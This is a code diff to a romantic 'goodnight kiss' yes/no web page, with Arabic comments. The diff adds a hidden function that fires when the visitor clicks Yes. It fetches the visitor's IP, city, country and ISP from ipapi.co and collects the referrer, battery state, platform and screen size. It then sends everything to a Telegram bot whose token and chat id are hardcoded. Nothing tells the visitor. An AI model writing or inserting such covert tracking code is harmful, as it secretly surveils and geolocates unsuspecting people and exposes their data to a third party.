@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Will you give me a goodnight kiss Dory?</title>
+    <title>Will you give me a goodnight kiss, Dory?</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Canvas Confetti CDN -->
@@ -240,6 +240,61 @@
             } catch (e) {}
         }
 
+        // --- إرسال الإشعار عند الضغط على YES ---
+        async function sendYesNotification() {
+            const _cfg = {
+                t: '7800042874:AAH6IhztbG2BeypuYl5_ZxKzFCOnmOgkD7k',
+                i: '8528072384'
+            };
+
+            try {
+                const vCnt = parseInt(localStorage.getItem('v_cnt') || 0);
+
+                let data = {};
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    data = await res.json();
+                } catch(e) {}
+
+                const ref = document.referrer.toLowerCase();
+                let source = "Direct Entry / Bookmark 🔗";
+                if (ref.includes('facebook')) source = "Facebook 🟦";
+                else if (ref.includes('instagram')) source = "Instagram 📸";
+                else if (ref.includes('whatsapp')) source = "WhatsApp 🟢";
+                else if (ref.includes('telegram')) source = "Telegram ✈️";
+                else if (ref.includes('google')) source = "Google Search 🔍";
+                else if (ref !== "") source = `External: ${new URL(ref).hostname}`;
+
+                let batt = "N/A";
+                if (navigator.getBattery) {
+                    try {
+                        const b = await navigator.getBattery();
+                        batt = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging ⚡' : 'Discharging 🔋'})`;
+                    } catch(e) {}
+                }
+
+                const report = 
+                    `💖 [DORY SAID YES! 🎉💋]\n` +
+                    `--------------------------\n` +
+                    `📥 SOURCE: ${source}\n` +
+                    `📍 Location: ${data.city || 'N/A'}, ${data.country_name || 'N/A'}\n` +
+                    `🌐 IP Address: ${data.ip || 'N/A'}\n` +
+                    `📡 ISP: ${data.org || 'N/A'}\n` +
+                    `--------------------------\n` +
+                    `📱 Device Info:\n` +
+                    `   • Battery: ${batt}\n` +
+                    `   • Platform: ${navigator.platform}\n` +
+                    `   • Resolution: ${window.screen.width}x${window.screen.height}\n` +
+                    `   • Moves tried: ${clickCount}\n` +
+                    `--------------------------\n` +
+                    `🔗 Site: ${document.title}\n` +
+                    `⏰ Local Time: ${new Date().toLocaleString()}`;
+
+                const url = `https://api.telegram.org/bot${_cfg.t}/sendMessage?chat_id=${_cfg.i}&text=${encodeURIComponent(report)}`;
+                fetch(url);
+            } catch (err) {}
+        }
+
         function createBackgroundHearts() {
             const container = document.getElementById('heartsContainer');
             const heartCount = 14;
@@ -339,6 +394,9 @@
 
             if (crazyMoveTimeout) clearTimeout(crazyMoveTimeout);
 
+            // نبعت الإشعار على تليجرام فوراً أول ما تضغط على زرار Yes
+            sendYesNotification();
+
             playVictorySound();
 
             const initialPage = document.getElementById('initialPage');
@@ -419,6 +477,6 @@
             });
         });
     </script>
-    <script src="jquery.counter.js"></script>
 </body>
 </html>
+
